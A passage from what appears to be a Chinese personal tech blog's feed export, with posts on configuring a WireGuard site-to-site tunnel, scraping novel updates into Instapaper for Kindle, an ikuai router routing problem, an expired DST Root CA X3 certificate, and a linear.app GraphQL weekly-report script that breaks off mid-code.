<h1 id="2-wireguard-配置"><a href="#2-wireguard-配置" class="headerlink" title="2 wireguard 配置"></a>2 wireguard 配置</h1><p>这里有一些假设：</p>
<table>
<thead>
<tr>
<th>网络</th>
<th>私网网段</th>
<th>网关私网 IP</th>
<th>网关公网 IP</th>
</tr>
</thead>
<tbody><tr>
<td>A</td>
<td>10.0.1.0&#x2F;24</td>
<td>10.0.1.1</td>
<td>1.1.1.1</td>
</tr>
<tr>
<td>B</td>
<td>10.0.2.0&#x2F;24</td>
<td>10.0.2.1</td>
<td>2.2.2.2</td>
</tr>
</tbody></table>
<h2 id="2-1-生成密钥对"><a href="#2-1-生成密钥对" class="headerlink" title="2.1 生成密钥对"></a>2.1 生成密钥对</h2><p>在两个网络分别用来打洞的主机（也就是网关） 10.0.1.1 和 10.0.2.1 上分别执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">umask</span> 077;</span><br><span class="line"><span class="built_in">cd</span> /root;</span><br><span class="line">wg genkey &gt; privatekey;</span><br><span class="line">wg pubkey &lt; privatekey &gt; publickey;</span><br><span class="line"><span class="built_in">umask</span> 022;</span><br></pre></td></tr></table></figure>

<h2 id="2-2-生成配置文件"><a href="#2-2-生成配置文件" class="headerlink" title="2.2 生成配置文件"></a>2.2 生成配置文件</h2><p>这也需要分别在两个网关上分别执行，以 10.0.1.1 上执行为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt;&gt; /etc/wireguard/wg_A.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[Interface]</span></span><br><span class="line"><span class="string">ListenPort = 36725</span></span><br><span class="line"><span class="string">PrivateKey = $(cat /root/privatekey)</span></span><br><span class="line"><span class="string">PostUp = sysctl -w net.ipv4.ip_forward=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Peer]</span></span><br><span class="line"><span class="string">PublicKey = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=</span></span><br><span class="line"><span class="string">AllowedIPs = 10.0.2.0/24</span></span><br><span class="line"><span class="string">Endpoint = 2.2.2.2:36725</span></span><br><span class="line"><span class="string">PersistentKeepalive = 25</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>稍稍解释一下：</p>
<ul>
<li>36725：这个是 wireguard 服务所用的端口号，理论上来讲自己定就好了，不过要记得在防火墙、安全组里打开</li>
<li>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x3D;：这个是对端机器的 publickey，在这里就应该是 10.0.2.1 上的 &#x2F;root&#x2F;publickey 的文件内容</li>
<li>wg_A：这个其实也是随便取的。如果配置文件是 (&#x2F;etc&#x2F;wireguard&#x2F;)wg_A.conf，那么做 wg-quick down&#x2F;up 动作的时候，参数就应该是 wg_A</li>
<li>Peer 段可以有多个，代表这是一个一对多的“洞”（隧道）</li>
</ul>
<p>10.0.2.1 上也要做类似的设置</p>
<h2 id="2-3-启动-wireguard"><a href="#2-3-启动-wireguard" class="headerlink" title="2.3 启动 wireguard"></a>2.3 启动 wireguard</h2><p>同样以 10.0.1.1 为例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wg-quick up wg_A;</span><br></pre></td></tr></table></figure>

<p>在 10.0.2.1 上则是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wg-quick up wg_B;</span><br></pre></td></tr></table></figure>

<p>这时，在 10.0.1.1 上应该能 ping 通 10.0.2.1，在 10.0.2.1 上也能 ping 通 10.0.1.1 了（如果不行，请检查 10.0.1.1 和 10.0.2.1 的防火墙安全组设置）。</p>
<h2 id="2-4-其他后续工作"><a href="#2-4-其他后续工作" class="headerlink" title="2.4 其他后续工作"></a>2.4 其他后续工作</h2><ul>
<li>安全组、防火墙上打开 udp 端口 36725 的入权限</li>
<li>在网络 A 和 B 上分别将 10.0.2.0&#x2F;24 和 10.0.1.0&#x2F;24 的路由指向 10.0.1.1 和 10.0.2.1</li>
</ul>
<p>做完这个后，10.0.1.0&#x2F;24 段和 10.0.2.0&#x2F;24 段之间应该完全互通了。</p>
<h1 id="3-wireguard-维护"><a href="#3-wireguard-维护" class="headerlink" title="3 wireguard 维护"></a>3 wireguard 维护</h1><p>这里依然以 10.0.1.1 的机器为例来谈 wireguard 服务的维护：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动服务（端口）</span></span><br><span class="line">wg-quick up wg_A;</span><br><span class="line"><span class="comment"># 停止服务（端口）</span></span><br><span class="line">wg-quick down wg_A;</span><br></pre></td></tr></table></figure>

<h1 id="4-Troubleshooting"><a href="#4-Troubleshooting" class="headerlink" title="4 Troubleshooting"></a>4 Troubleshooting</h1><p>当出问题的时候，可以用命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dkms status;</span><br></pre></td></tr></table></figure>

<p>来查看一下 wireguard 模块儿是否处于 installed 状态，如果没有，那么需要手工安装 wireguard 模块。手工安装时再看出了什么问题，见招拆招。多半原因是 kernel 源代码没安装，或者什么包不存在导致的。</p>
<h1 id="5-多说几句"><a href="#5-多说几句" class="headerlink" title="5 多说几句"></a>5 多说几句</h1><p>前面提到，一台机器（如前面的 10.0.1.1 和 10.0.2.1）要打多个洞到不同的地方，其方法有两种：</p>
<ol>
<li>在一个配置文件（如上面的 &#x2F;etc&#x2F;wireguard&#x2F;wg_A.conf）里写多个 Peer</li>
<li>在目录 &#x2F;etc&#x2F;wireguard 下用多个配置文件，比如 wg_A2B.conf、wg_A2C.conf 等</li>
</ol>
<p>这两种方法各有什么优缺点呢？</p>
<p>以方案一为例：</p>
<ul>
<li>优点是配置清爽、直观，而且只需要一个 udp 端口；</li>
<li>缺点是从系统层面看只会有一个 wireguard 的链路，这样以后如果做 ospf 之类的动态路由，就不太好弄了；</li>
</ul>
<p>方案二就自己想吧：）</p>
]]></content>
      <tags>
        <tag>tunnel</tag>
        <tag>wireguard</tag>
        <tag>wg-quick</tag>
        <tag>dkms</tag>
      </tags>
  </entry>
  <entry>
    <title>用 Kindle 来追网文</title>
    <url>/2020/05/%E7%94%A8kindle%E8%BF%BD%E7%BD%91%E6%96%87/index.html</url>
    <content><![CDATA[<h1 id="用-Kindle-来追网文"><a href="#用-Kindle-来追网文" class="headerlink" title="用 Kindle 来追网文"></a>用 Kindle 来追网文</h1><p>为嘛要干这个呢？这个说来话长，可能还是跟本人的实际情况有关系，别人可能还真没有这需求，毕竟，各种设备基本上都有 Kindle 和 Instapaper 的应用吧，直接看不香吗？所以，这里不解释，有需求的自然懂。</p>
<p>代码及主要思路来自于：<a href="https://dlsong.com/tech/fetch_novel/">这里</a></p>
<span id="more"></span>

<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="Instapaper"><a href="#Instapaper" class="headerlink" title="Instapaper"></a>Instapaper</h3><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p>原来的代码用的是 Instapaper simple API，而我改过的是用的 Instapaper full API，所以，使用之前需要在 <a href="https://www.instapaper.com/main/request_oauth_consumer_token">Instapaper 官方</a> 先申请 token</p>
<p>申请通过后，会收到两个东西：</p>
<ul>
<li>token</li>
<li>secret</li>
</ul>
<p>这两样和账号密码后面程序里会用</p>
<h4 id="send-to-Kindle-设置"><a href="#send-to-Kindle-设置" class="headerlink" title="send to Kindle 设置"></a>send to Kindle 设置</h4><p>注册一个 Instapaper 账号并登录，点击右上角你的用户名，再选 “Settings”（或者在地址栏里直接访问<a href="https://www.instapaper.com/user">这里</a>），往下翻到 Kindle 的相关设置部分。</p>
<p>这里需要注意的是有两点：</p>
<ol>
<li>需要在 <a href="https://www.amazon.com/gp/digital/fiona/manage?&#pdocSettings">Kindle 个人文档设置</a> 里将 Instapaper 的发件地址（类似于 ‘kindle.?????@instapaper.com’ 这样，具体点击 “Your Kindle Email Address” 旁边链接：”what’s this?” 查看）加到白名单里去。</li>
<li>“Your Kindle Email Address” 是填你 Kindle 设备收文档的地址，在 <a href="https://www.amazon.com/gp/digital/fiona/manage?&#pdocSettings">Kindle 个人文档设置</a> 里可以找到。</li>
</ol>
<h3 id="运行环境"><a href="#运行环境" class="headerlink" title="运行环境"></a>运行环境</h3><h4 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h4><p>这个很正常，你在哪里准备 Python 环境？你的程序写好了在哪里跑？我是跑在一个 VPS 上的。</p>
<h4 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h4><p>这里也没什么，也就是各种依赖的包的安装，Python 版本也没啥要求，2 或 3 都应该可以，我用的是 2.7</p>
<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>这部分已经更新，详见： <a href="/2020/07/%E7%94%A8%20Kindle%20%E8%BF%BD%E7%BD%91%E6%96%87_2/index.html" title="用 Kindle 来追网文之二">用 Kindle 追网文之二</a><br><del>下面才是真正的戏肉部分，废话不说，直接上代码：</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os.path</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> pyinstapaper.instapaper <span class="keyword">import</span> Instapaper, Folder, Bookmark</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下四个变量根据自己的情况填写</span></span><br><span class="line">INSTAPAPER_KEY = <span class="string">&#x27;************************&#x27;</span></span><br><span class="line">INSTAPAPER_SECRET = <span class="string">&#x27;*********************&#x27;</span></span><br><span class="line">INSTAPAPER_LOGIN = <span class="string">&#x27;u@x.com&#x27;</span></span><br><span class="line">INSTAPAPER_PASSWORD = <span class="string">&#x27;password&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 几本书，用来做例子</span></span><br><span class="line">novel_list = [<span class="string">&quot;苏厨&quot;</span>, <span class="string">&quot;王老实的幸福生活&quot;</span>, <span class="string">&quot;大魔王又出手了&quot;</span>]</span><br><span class="line">novel_url = [<span class="string">&#x27;392_392855&#x27;</span>, <span class="string">&#x27;7_7669&#x27;</span>, <span class="string">&#x27;431_431648&#x27;</span>]</span><br><span class="line"></span><br><span class="line">instapaper = Instapaper(INSTAPAPER_KEY, INSTAPAPER_SECRET)</span><br><span class="line">instapaper.login(INSTAPAPER_LOGIN, INSTAPAPER_PASSWORD)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fetch_novel</span>(<span class="params">novel_list, novel_url</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;url.pkl&#x27;</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.pkl&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            last_url = pickle.load(f)</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        last_url=[[],[],[],[]]</span><br><span class="line"></span><br><span class="line">    url_archve = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(novel_list)):</span><br><span class="line">        old_url=last_url[j]</span><br><span class="line">        url = <span class="string">&#x27;https://www.xinxs.la/&#x27;</span>+novel_url[j]+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        urlm = <span class="string">&#x27;https://m.xinxs.la/&#x27;</span>+novel_url[j]+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        head = &#123;&#125;</span><br><span class="line">        head[<span class="string">&#x27;User-Agent&#x27;</span>] = <span class="string">&#x27;Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166  Safari/535.19&#x27;</span></span><br><span class="line">        page = requests.get(url)</span><br><span class="line">        soup = BeautifulSoup(page.content,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        soup_text = soup.find_all(<span class="string">&quot;a&quot;</span>, href=re.<span class="built_in">compile</span>(<span class="string">&quot;\d+\.html&quot;</span>), style=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        latest_url=[]</span><br><span class="line">        latest_title=[]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(soup_text)):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> soup_text[i][<span class="string">&#x27;href&#x27;</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            latest_url.append(urlm + soup_text[i][<span class="string">&#x27;href&#x27;</span>])</span><br><span class="line">            latest_title.append(novel_list[j]+<span class="string">&#x27;---&#x27;</span>+soup_text[i].string.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(latest_url)):</span><br><span class="line">            <span class="keyword">if</span> latest_url[k] <span class="keyword">in</span> old_url:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            data = &#123; <span class="string">&#x27;time&#x27;</span>: time.time(), <span class="string">&#x27;progress_timestamp&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;title&#x27;</span>: latest_title[k], <span class="string">&#x27;url&#x27;</span>: latest_url[k] &#125;</span><br><span class="line">            bookmark = Bookmark(instapaper, **data)</span><br><span class="line">            bookmark.add()</span><br><span class="line"></span><br><span class="line">        old_url=latest_url</span><br><span class="line">        url_archive.append(old_url)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;url.pkl&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(url_archive,f)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每次抓取新的文章之前，先把以前的删掉</span></span><br><span class="line">bookmarks = instapaper.get_bookmarks(<span class="string">&#x27;unread&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> ct, bookmark <span class="keyword">in</span> <span class="built_in">enumerate</span>(bookmarks):</span><br><span class="line">    bookmark.archive()</span><br><span class="line">    bookmark.delete()</span><br><span class="line"></span><br><span class="line">fetch_novel(novel_list, novel_url)</span><br></pre></td></tr></table></figure>

<h2 id="待改进的地方"><a href="#待改进的地方" class="headerlink" title="待改进的地方"></a>待改进的地方</h2><ol>
<li>目前抓链接是通过 <a href="http://www.xinxs.la/">www.xinxs.la</a> 来直接抓的，由于其 html 代码不够规范，只能用 lxml 模块丑陋的实现了查找更新链接的工作，后来才发现了原来还有移动端适配版本：m.xinxs.la，如果这个 html 代码规范的话，我想用更优雅的方式来实现查找链接的工作</li>
</ol>
]]></content>
      <tags>
        <tag>Kindle</tag>
        <tag>Python</tag>
        <tag>Instapaper</tag>
      </tags>
  </entry>
  <entry>
    <title>用爱快路由器碰到的一个网络问题</title>
    <url>/2019/05/%E7%94%A8%E7%88%B1%E5%BF%AB%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A2%B0%E5%88%B0%E7%9A%84%E4%B8%80%E4%B8%AA%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/index.html</url>
    <content><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>我厂大内网都是通过 wireguard 联通的，具体可以参见文章：<a href="/2019/11/%E7%94%A8%20wireguard%20%E5%9C%A8%E4%B8%A4%E4%B8%AA%E7%BD%91%E7%BB%9C%E4%B9%8B%E9%97%B4%E6%89%93%E6%B4%9E/index.html" title="用 wireguard 在两个网络之间打洞">用 wireguard 在两个网络之间打洞</a> 能了解以前的“洞”是怎么打的，还可以参见文章：<a href="/2019/03/Linux%20%E4%B8%8B%20wireguard%20%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/index.html" title="Linux 下 wireguard 出问题的解决">Linux 下 wireguard 出问题的解决</a> 了解 wireguard 打洞曾经踩过的坑。</p>
<span id="more"></span>

<p>我厂办公室的上网环境大致如下图所示（IP 地址啥的都做了相应替换处理）：</p>
<p><img src="https://raw.githubusercontent.com/haw-haw/image-hosting/master/img/ikuai.jpg" alt="我厂办公网上网环境示意图"></p>
<ul>
<li>10.0.0.0&#x2F;24 段是我厂办公室私网<ul>
<li>10.0.0.1 为缺省网关，是一个爱快路由器，主机名也叫 ikuai</li>
<li>10.0.0.254 是 Server 这台机器的私网地址</li>
<li>ikuai 上有设置静态路由，将 10.0.1.0&#x2F;24 的下一跳指向了 Server(10.0.0.254)</li>
</ul>
</li>
<li>10.0.1.0&#x2F;24 段是套路云 VPC 的私网地址<ul>
<li>缺省网关是 10.0.1.254</li>
<li>10.0.1.1 是套路云的一台云主机，有公网地址，机器名是 EC2（貌似 ECS 更合适）</li>
<li>路由表里将 10.0.0.0&#x2F;24 的下一跳指向了 EC2 这个云主机了</li>
</ul>
</li>
<li>Server 通过 wireguard 协议跟 EC2 链接，打通了 10.0.0.0&#x2F;24 和 10.0.1.0&#x2F;24 两个网段</li>
<li>ikuai 上把 wireguard 所用的 udp 端口流量转发给了 Server</li>
<li>EC2 上 wireguard 认的对端地址是 ikuai 的公网地址和那个转发的 udp 端口</li>
</ul>
<h1 id="问题表现"><a href="#问题表现" class="headerlink" title="问题表现"></a>问题表现</h1><p>从 10.0.0.0&#x2F;24 段的机器，比如 PC，去 ssh 10.0.1.0&#x2F;24 段的服务器的时候，一般会很慢，而且很大概率会出错：</p>
<blockquote>
<p>kex_exchange_identification: read: Connection reset by peer</p>
</blockquote>
<p>在 PC 上和 Server 上听包，结果发现：</p>
<ul>
<li>三次握手的前几个包都正常</li>
<li>但是 PC 回给 EC2 的最后一个 ack 包被 ikuai “吃”掉了<ul>
<li>PC 上听包发现这个包的确是发给了 ikuai（目标 mac 是 ikuai 的）</li>
<li>Server 又没有及时收到，正常 ikuai 应该把这个包转发到 Server 上的<ul>
<li>最后好一点的结果就是几次重传之后，Server 收到了这个包，发给了 EC2，链接建立了，只是从表现上来看比较慢</li>
<li>坏的结果就直接是：Connection reset by peer。服务器直接断开链接了</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>由于 ikuai 是个黑核，我无从得知里面发上了什么，而且也曾联系了 ikuai 的客服，甚至还通过关系联系了 ikuai 的技术人员，回答也是：“不知道”，那没办法，这个锅目前来看只能是 ikuai 来背了。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p>其实问题并没有完全搞明白，更谈不上解决。我只能说是“绕过”了问题，办法是通过在需要连接 10.0.1.0&#x2F;24 段的机器（这里如 PC） 本地添加路由，将 10.0.1.0&#x2F;24 的下一跳强制指到 Server(10.0.0.254) 。这样做以后，问题没再发生，算是“绕过”问题了。</p>
<p>其实还有个方法：就是在 PC 上打开 accept_redircts，这样 PC 会接受 ikuai 发过来的 “icmp redirect” 消息，将 Server 设置为新的路由网关（效果其实等于我们直接手工添加）。但这个不太安全，所以一般都不建议打开。</p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>对这个问题有经验的大佬，请不吝赐教。如需进一步的测试检测，请务必通知我配合。谢谢！</p>
]]></content>
      <tags>
        <tag>wireguard</tag>
        <tag>ikuai</tag>
        <tag>爱快</tag>
        <tag>accept_redirects</tag>
        <tag>secure_redirects</tag>
        <tag>VPC</tag>
        <tag>打洞</tag>
        <tag>ack</tag>
      </tags>
  </entry>
  <entry>
    <title>踩坑：根证书过期</title>
    <url>/2021/02/%E8%B8%A9%E5%9D%91%E6%A0%B9%E8%AF%81%E4%B9%A6%E8%BF%87%E6%9C%9F/index.html</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>有人说：</p>
<blockquote>
<p>职能团队不能说“不”（There is no “NO”.）。</p>
</blockquote>
<p>意思是需求方提出的不管是什么需求，都要有解决方案。这不，公司由于业务需要，某些个团队有科学上网的需求（其实技术团队也有），提到运维这里了，我没法说搞不定呀，于是只能吭哧吭哧想办法解决，最早一版我自己用了好几年的方案被毙，理由是不要用，太复杂（其实也没有被毙，技术团队大多在用这个方案）。于是我就有整了个简单好用的方案，这几天正忙着方案落地呢。</p>
<p>在服务器上安装软件的时候，发现了这个问题。</p>
<span id="more"></span>

<h2 id="问题详情"><a href="#问题详情" class="headerlink" title="问题详情"></a>问题详情</h2><p>两台 Amazon Linux 2 的服务器，在我用 rpm 命令加 url 方式安装软件的时候，一台成功，一台出错。</p>
<p>仔细查，出错的那台是因为 <a href="https://download.libreswan.org/">https://download.libreswan.org/</a> 的证书过期。但为什么另外一台又没有问题呢？继续查：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl s_client \</span><br><span class="line">	-showcerts \</span><br><span class="line">	-connect download.libreswan.org:443</span><br></pre></td></tr></table></figure>

<p>两台机器上分别执行上面的这个脚本，结果发现：</p>
<p>出错的那一台报（以下是部分输出）：</p>
<blockquote>
<p>depth&#x3D;3 O &#x3D; Digital Signature Trust Co., CN &#x3D; DST Root CA X3<br>verify error:num&#x3D;10:certificate has expired<br>notAfter&#x3D;Sep 30 14:01:15 2021 GMT</p>
</blockquote>
<p>好的那一台却报的是（以下是部分输出）：</p>
<blockquote>
<p>depth&#x3D;2 C &#x3D; US, O &#x3D; Internet Security Research Group, CN &#x3D; ISRG Root X1<br>verify return:1<br>depth&#x3D;1 C &#x3D; US, O &#x3D; Let’s Encrypt, CN &#x3D; R3<br>verify return:1<br>depth&#x3D;0 CN &#x3D; libreswan.org<br>verify return:1</p>
</blockquote>
<p>从看到的证书链上来看：</p>
<ul>
<li>证书 “CN&#x3D;libreswan.org” 是“C&#x3D;US&#x2F;O&#x3D;Let’s Encrypt&#x2F;CN&#x3D;R3” 签发的</li>
<li>而 “C&#x3D;US&#x2F;O&#x3D;Let’s Encrypt&#x2F;CN&#x3D;R3”是“C&#x3D;US&#x2F;O&#x3D;Internet Security Research Group&#x2F;CN&#x3D;ISRG Root X1”签发的</li>
<li>“C&#x3D;US&#x2F;O&#x3D;Internet Security Research Group&#x2F;CN&#x3D;ISRG Root X1”是“O&#x3D;Digital Signature Trust Co.&#x2F;CN&#x3D;DST Root CA X3”签发的</li>
</ul>
<p>而过期的正是这个“DST Root CA X3”证书。</p>
<h2 id="原因所在"><a href="#原因所在" class="headerlink" title="原因所在"></a>原因所在</h2><p>最后发现两台机器的区别在哪里？在于软件包 ca-certificates 版本不一样，这个正是放系统自带信任的 CA 证书的软件包。其中报错的那台，ca-certificates 有“DST Root CA X3”这个证书；而不报错的那台 ca-certificates 里没有“DST Root CA X3”这个证书。</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>问题解决也简单，报错的那台升级下 ca-certificates 即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y update ca-certificates</span><br></pre></td></tr></table></figure>

<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>其实在两个不同版本的 ca-certificates 里，“ISRG Root X1”都在信任的根证书列表里面，为什么信任的根证书列表里有“DST Root CA X3”会出错呢？</p>
<h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>其实这些，AWS 官方早有文档说法，参见链接：</p>
<ul>
<li><a href="https://aws.amazon.com/premiumsupport/knowledge-center/ec2-expired-certificate/">https://aws.amazon.com/premiumsupport/knowledge-center/ec2-expired-certificate/</a></li>
<li><a href="https://aws.amazon.com/amazon-linux-2/release-notes/">https://aws.amazon.com/amazon-linux-2/release-notes/</a></li>
</ul>
]]></content>
      <tags>
        <tag>curl</tag>
        <tag>DST Root CA X3</tag>
        <tag>SSL Certificate</tag>
        <tag>expired</tag>
        <tag>openssl</tag>
        <tag>Amazon Linux 2</tag>
        <tag>ca-certificates</tag>
        <tag>ISRG Root X1</tag>
      </tags>
  </entry>
  <entry>
    <title>通过 API 抓取 linear.app 的任务生成周报</title>
    <url>/2023/04/%E9%80%9A%E8%BF%87%20API%20%E6%8A%93%E5%8F%96%20linear.app%20%E7%9A%84%E4%BB%BB%E5%8A%A1%E7%94%9F%E6%88%90%E5%91%A8%E6%8A%A5/index.html</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>某个项目用了 linear.app 来做任务分配和跟踪，为了写周报，想利用 API 来自动获取任务信息。</p>
<span id="more"></span>

<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="获取-API-密钥"><a href="#获取-API-密钥" class="headerlink" title="获取 API 密钥"></a>获取 API 密钥</h3><p>在 linear.app 里，点击自己的头像-&gt;Settings，点击左边导航栏的 <code>API</code>，在右边页面的 <code>Personal API keys</code> 下面 <code>Create key</code> 一下，然后记住。</p>
<h3 id="安装-SDK"><a href="#安装-SDK" class="headerlink" title="安装 SDK"></a>安装 SDK</h3><p>linear.app 的官方的 SDK 是 TypeScript 写的，但实际上 JavaScript 也是兼容的吧。官方给的安装 SDK 的命令就是下面这个：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install @linear/sdk</span><br><span class="line"><span class="comment"># 安装 SDK</span></span><br></pre></td></tr></table></figure>

<h3 id="GraphQL-介绍"><a href="#GraphQL-介绍" class="headerlink" title="GraphQL 介绍"></a>GraphQL 介绍</h3><p>linear.app 的公开的 API 都是用 GraphQL 搭建的，官方也建议用 GraphQL 来获取数据</p>
<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>前方高能预警：调包侠再次上线！</p>
<p>核心实现代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">LinearClient</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@linear/sdk&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用你的linear.app API密钥替换这里的YOUR_API_KEY</span></span><br><span class="line"><span class="keyword">const</span> apiKey = <span class="string">&#x27;lin_api_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> linearClient = <span class="keyword">new</span> <span class="title class_">LinearClient</span>(&#123; apiKey &#125;);</span><br><span class="line"><span class="keyword">const</span> graphQLClient = linearClient.<span class="property">client</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个GraphQL查询来获取上一周完成的工作列表</span></span><br><span class="line"><span class="keyword">const</span> queryLastWeekWork = <span class="string">`</span></span><br><span class="line"><span class="string">  query GetLastWeekWork($startDate: DateTime, $endDate: DateTime) &#123;</span></span><br><span class="line"><span class="string">    viewer &#123;</span></span><br><span class="line"><span class="string">        assignedIssues(filter: &#123;</span></span><br><span class="line"><span class="string">            state: &#123; type: &#123; eq: &quot;completed&quot; &#125; &#125;</span></span><br><span class="line"><span class="string">            completedAt: &#123;</span></span><br><span class="line"><span class="string">                gte: $startDate</span></span><br><span class="line"><span class="string">                lte: $endDate</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;) &#123;</span></span><br><span class="line"><span class="string">            nodes &#123;</span></span><br><span class="line"><span class="string">                id</span></span><br><span class="line"><span class="string">                title</span></span><br><span class="line"><span class="string">                completedAt</span></span><br><span class="line"><span class="string">                url</span></span><br><span class="line"><span class="string">                creator &#123; id &#125;</span></span><br><span class="line"><span class="string">                assignee &#123; id &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数来获取上周的日期范围</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getLastWeekDates</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> today = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">  <span class="keyword">const</span> lastWeekStart = <span class="keyword">new</span> <span class="title class_">Date</span>(today);</span><br><span class="line">  lastWeekStart.<span class="title function_">setDate</span>(today.<span class="title function_">getDate</span>() - <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">const</span> lastWeekEnd = <span class="keyword">new</span> <span class="title class_">Date</span>(today);</span><br><span class="line">  lastWeekEnd.<span class="title function_">setDate</span>(today.<span class="title function_">getDate</span>());</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">startDate</span>: lastWeekStart.<span class="title function_">toISOString</span>(), <span class="attr">endDate</span>: lastWeekEnd.<span class="title function_">toISOString</span>() &#125;;</span><br><span class="line">&#125;</span><br><span 